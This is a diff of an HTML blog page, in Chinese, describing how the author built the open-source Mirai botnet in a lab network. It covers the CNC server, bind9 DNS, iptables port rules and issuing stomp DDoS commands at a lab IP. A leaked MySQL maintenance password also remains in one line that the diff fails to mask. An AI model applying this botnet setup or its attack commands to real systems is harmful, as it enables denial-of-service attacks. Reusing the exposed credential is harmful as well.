@@ -102,7 +102,7 @@
 <meta property="og:site_name" content="metang&#39;s blog">
 <meta property="og:description" content="在实验室的内网环境里搭建了mirai的bot，在公网IP上搭建了cnc服务器。目前可以通过Telnet登陆到cnc服务并下发命令给内网的bot，让它们对指定IP的某个端口进行ddos攻击。其实步骤也不多，但是网上很多教程说的不是特别清楚，导致中间踩了好多坑才搭好。难点主要在搭建自己的DNS解析服务器以及Telnet登陆到cnc服务器，还有一些小问题就是有些需要传输数据的端口默认是关闭的，需要注意开">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-04-21T04:13:34.863Z">
+<meta property="og:updated_time" content="2019-04-21T05:34:13.658Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="开源代码mirai环境初步搭建">
 <meta name="twitter:description" content="在实验室的内网环境里搭建了mirai的bot，在公网IP上搭建了cnc服务器。目前可以通过Telnet登陆到cnc服务并下发命令给内网的bot，让它们对指定IP的某个端口进行ddos攻击。其实步骤也不多，但是网上很多教程说的不是特别清楚，导致中间踩了好多坑才搭好。难点主要在搭建自己的DNS解析服务器以及Telnet登陆到cnc服务器，还有一些小问题就是有些需要传输数据的端口默认是关闭的，需要注意开">
@@ -470,8 +470,8 @@
 <p>. 安装数据库： sudo apt-get install mysql-server mysql-client（安装时需要设置数据库密码要记住）</p>
 <p><strong>[坑1] mysql安装时没有提示输入密码  安装好后进不了mysql</strong></p>
 <p>查看sudo vim /etc/mysql/debian.cnf  这里保存了安装时系统自己设置的用户名和密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># Automatically generated for Debian scripts. DO NOT TOUCH!</div><div class="line">[client]</div><div class="line">host     = localhost</div><div class="line">user     = debian-sys-maint</div><div class="line">password = Jhr3w56TlizV0D0w</div><div class="line">socket   = /var/run/mysqld/mysqld.sock</div><div class="line">[mysql_upgrade]</div><div class="line">host     = localhost</div><div class="line">user     = debian-sys-maint</div><div class="line">password = Jhr3w56TlizV0D0w</div><div class="line">socket   = /var/run/mysqld/mysqld.sock</div><div class="line">~</div></pre></td></tr></table></figure>
-<p>mysql -udebian-sys-maint -pJhr3w56TlizV0D0w mirai  输入之后可以登录进数据库了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># Automatically generated for Debian scripts. DO NOT TOUCH!</div><div class="line">[client]</div><div class="line">host     = localhost</div><div class="line">user     = debian-sys-maint</div><div class="line">password = xxxxxxx</div><div class="line">socket   = /var/run/mysqld/mysqld.sock</div><div class="line">[mysql_upgrade]</div><div class="line">host     = localhost</div><div class="line">user     = debian-sys-maint</div><div class="line">password = Jhr3w56TlizV0D0w</div><div class="line">socket   = /var/run/mysqld/mysqld.sock</div><div class="line">~</div></pre></td></tr></table></figure>
+<p>mysql -udebian-sys-maint -pxxxxxxx mirai  输入之后可以登录进数据库了</p>
 <h1 id="配置DNS服务器"><a href="#配置DNS服务器" class="headerlink" title="配置DNS服务器"></a>配置DNS服务器</h1><p>由于僵尸机器是通过解析域名来得到cnc服务的地址的，所以我在台式机192.168.2.136安装了bind9，搭建局域网内的dns解析服务器。</p>
 <p>mytang@mytang-QiTianM610-D529:/etc</p>
 <p>其中db.mytang.com是为了我需要解析的域名而新加的文件 内容为：</p>
@@ -481,10 +481,14 @@
 <p>重启bind9： sudo /etc/init.d/bind9 restart</p>
 <p>只配置了域名解析到ip这部分的功能 。而且还得在/etc/resolv.conf里面增加nameserver 192.168.2.136</p>
 <p><strong>[坑2]重启bind9之后在本机可以通过</strong></p>
-<p>&gt;<br>nslookup www.mytang.com 192.168.2.136</p>
+<blockquote>
+<p>nslookup www.mytang.com 192.168.2.136</p>
+</blockquote>
 <p>查看，验证dns可以解析了。但是在192.168.105.127虚拟机上面无法解析   报的错误是超时。后来发现是防火墙配置只让53端口的input被接受了 没有accept53端口的OUTPUT 。除了tcp 还得设置udp的。(但是重启之后就又要重新设置了)                        </p>
 <p>DNS同时占用TCP和UDP的53号端口。因为查询很频繁，使用UDP报文给服务器带来的负担小，所以查询的时候使用的是UDP报文。主副DNS进行区域传送的时候，用TCP，因为要保证数据的准确性。</p>
-<p>&gt;<br>iptables -A OUTPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A OUTPUT -p udp –dport 53 -j ACCEPT<br>iptables -A INPUT -p udp –dport 53 -j ACCEPT   </p>
+<blockquote>
+<p>iptables -A OUTPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A OUTPUT -p udp –dport 53 -j ACCEPT<br>iptables -A INPUT -p udp –dport 53 -j ACCEPT   </p>
+</blockquote>
 <p>输入sudo /etc/init.d/bind9 restart 重启bind9 然后可以查询到了。</p>
 <p><strong>[坑3]bind9设置的域名不能带下划线之类的符号</strong></p>
 <h1 id="配置主控端cnc"><a href="#配置主控端cnc" class="headerlink" title="配置主控端cnc"></a>配置主控端cnc</h1><p>基本参考<a href="https://www.jianshu.com/p/d16ee2cbe1e7" target="_blank" rel="external">https://www.jianshu.com/p/d16ee2cbe1e7</a> 进行配置 编译cnc文件夹下面的go语言编写的代码。</p>
@@ -521,9 +525,15 @@
 <h2 id="检查端口对应的进程"><a href="#检查端口对应的进程" class="headerlink" title="检查端口对应的进程"></a>检查端口对应的进程</h2><blockquote>
 <p>sudo netstat -napt|grep 23</p>
 </blockquote>
-<h2 id="查看端口的流量"><a href="#查看端口的流量" class="headerlink" title="查看端口的流量"></a>查看端口的流量</h2><p>&gt;<br>sudo tcpdump not src host 192.168.2.136  and dst port 22</p>
-<h2 id="cnc服务器所在的机器打开Telnet的23端口"><a href="#cnc服务器所在的机器打开Telnet的23端口" class="headerlink" title="cnc服务器所在的机器打开Telnet的23端口"></a>cnc服务器所在的机器打开Telnet的23端口</h2><p>&gt;<br>sudo iptables -A INPUT -p tcp –dport 23 -j ACCEPT<br>sudo iptables -A OUTPUT -p tcp –dport 23 -j ACCEPT<br>sudo iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT<br>sudo iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT        </p>
-<h2 id="dns解析服务器重启之后开启53端口"><a href="#dns解析服务器重启之后开启53端口" class="headerlink" title="dns解析服务器重启之后开启53端口"></a>dns解析服务器重启之后开启53端口</h2><p>&gt;<br>iptables -A OUTPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A OUTPUT -p udp –dport 53 -j ACCEPT<br>iptables -A INPUT -p udp –dport 53 -j ACCEPT</p>
+<h2 id="查看端口的流量"><a href="#查看端口的流量" class="headerlink" title="查看端口的流量"></a>查看端口的流量</h2><blockquote>
+<p>sudo tcpdump not src host 192.168.2.136  and dst port 22</p>
+</blockquote>
+<h2 id="cnc服务器所在的机器打开Telnet的23端口"><a href="#cnc服务器所在的机器打开Telnet的23端口" class="headerlink" title="cnc服务器所在的机器打开Telnet的23端口"></a>cnc服务器所在的机器打开Telnet的23端口</h2><blockquote>
+<p>sudo iptables -A INPUT -p tcp –dport 23 -j ACCEPT<br>sudo iptables -A OUTPUT -p tcp –dport 23 -j ACCEPT<br>sudo iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT<br>sudo iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT        </p>
+</blockquote>
+<h2 id="dns解析服务器重启之后开启53端口"><a href="#dns解析服务器重启之后开启53端口" class="headerlink" title="dns解析服务器重启之后开启53端口"></a>dns解析服务器重启之后开启53端口</h2><blockquote>
+<p>iptables -A OUTPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>iptables -A OUTPUT -p udp –dport 53 -j ACCEPT<br>iptables -A INPUT -p udp –dport 53 -j ACCEPT</p>
+</blockquote>
 <h1 id="攻击尝试"><a href="#攻击尝试" class="headerlink" title="攻击尝试"></a>攻击尝试</h1><h2 id="syn攻击"><a href="#syn攻击" class="headerlink" title="syn攻击"></a>syn攻击</h2><p>对应的函数为attack_tcp.c中的attack_tcp_syn函数</p>
 <h2 id="ack攻击"><a href="#ack攻击" class="headerlink" title="ack攻击"></a>ack攻击</h2><p>对应的函数为attack_tcp.c中的attack_tcp_ack</p>
 <h2 id="stomp攻击"><a href="#stomp攻击" class="headerlink" title="stomp攻击"></a>stomp攻击</h2><p>对应的函数为attack_tcp.c中的</p>
@@ -532,7 +542,9 @@
 <p>stomp 192.168.105.141 120 dport=22<br>stomp 192.168.105.141 120 dport=22</p>
 </blockquote>
 <p>攻击成功之后可以在对应机器上查看端口流量：</p>
-<p>&gt;<br>sudo tcpdump not src host 192.168.2.136  and dst port 22</p>
+<blockquote>
+<p>sudo tcpdump not src host 192.168.2.136  and dst port 22</p>
+</blockquote>
 <p>这里过滤掉的是我台式机ssh连接产生的流量。</p>
 
       
